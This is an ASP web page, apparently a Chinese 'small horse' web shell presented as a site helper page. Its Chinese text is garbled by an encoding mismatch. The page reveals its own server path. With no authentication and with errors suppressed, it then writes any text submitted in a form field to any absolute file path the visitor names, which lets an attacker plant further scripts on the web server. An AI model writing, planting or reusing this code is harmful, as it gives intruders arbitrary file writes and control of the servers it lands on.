<%@LANGUAGE="VBScript.Encode" CODEPAGE="936"%>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>��ע - ��վС����</title>
<style type="text/css">
<!--
.black {
	font-family: "����";
	font-size: 12px;
	color: #000000;
	text-decoration: none;
	line-height: 120%;}
-->
</style>
<style type="text/css">
<!--
a:link {
	font-family: "����";
	font-size: 12px;
	color: #00CC00;
	text-decoration: none;
}
a:visited {
	font-family: "����";
	font-size: 12px;
	color: #00CC00;
	text-decoration: none;
}
a:hover {
	font-family: "����";
	font-size: 12px;
	color: #333333;
	text-decoration: none;
}
-->
</style>
</head>
<body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<p>
<% dim objFSO %>
<% dim fdata %>
<% dim objCountFile %>
<% on error resume next %>
<% Set objFSO = Server.CreateObject("Scripting.FileSystemObject") %>
<% if Trim(request("syfdpath"))<>"" then %>
<% fdata = request("cyfddata") %>
<% Set objCountFile=objFSO.CreateTextFile(request("syfdpath"),True) %>
<% objCountFile.Write fdata %>
<% if err =0 then %>
<% response.write "<font color=#FFFF00>����ɹ�!</font>" %>
<% else %>
<% response.write "<font color=#FFFF00>����ʧ��!</font>" %>
<% end if %>
<% err.clear %>
<% end if %>
<% objCountFile.Close %>
<% Set objCountFile=Nothing %>
<% Set objFSO = Nothing %>
<% Response.write "</form>" %>
</p>
<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0" bordercolor="#FFFFFF">
<tr>
<td height="100%"> 
<table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
<tr>
<td><table width="700" border="0" align="center" cellpadding="0" cellspacing="1">
<tr>
<td bgcolor="#FFFFFF"><span class="black"> 
<% Response.write "���ļ����Ե�·��" %>
<%=server.mappath(Request.ServerVariables("SCRIPT_NAME")) %>
<br>
<% Response.write "�����ļ���<font color=red>����·��(�����ļ���:��D:\web\x.asp):</font>" %>
<% Response.write "<form action='''' method=post>" %>
</span> </td>
</tr>
<tr>
<td bgcolor="#FFFFFF"><span class="black">���뱣���·����<% Response.Write "<input type=text name=syfdpath width=200 size=81>" %>
</span></td>
</tr>
<tr>
<td bgcolor="#FFFFFF" class="black">
<% Response.write "�����ļ������ݣ�" %>
<% Response.write "<textarea name=cyfddata cols=80 rows=10 width=32></textarea>" %>
</td>
</tr>
<tr>
<td bgcolor="#FFFFFF"><div align="center"><span class="black">
<% Response.write "<input type=submit value=����>" %>
</span></div></td>
</tr>
</tr>
<td bgcolor="#FFFFFF" class="black"><div align="center"></a></div></td>
</tr>
</table></td>
</tr>
</table></td>
</tr>
</table>
</body>
</html>

�ϴ�</body></html></body></html>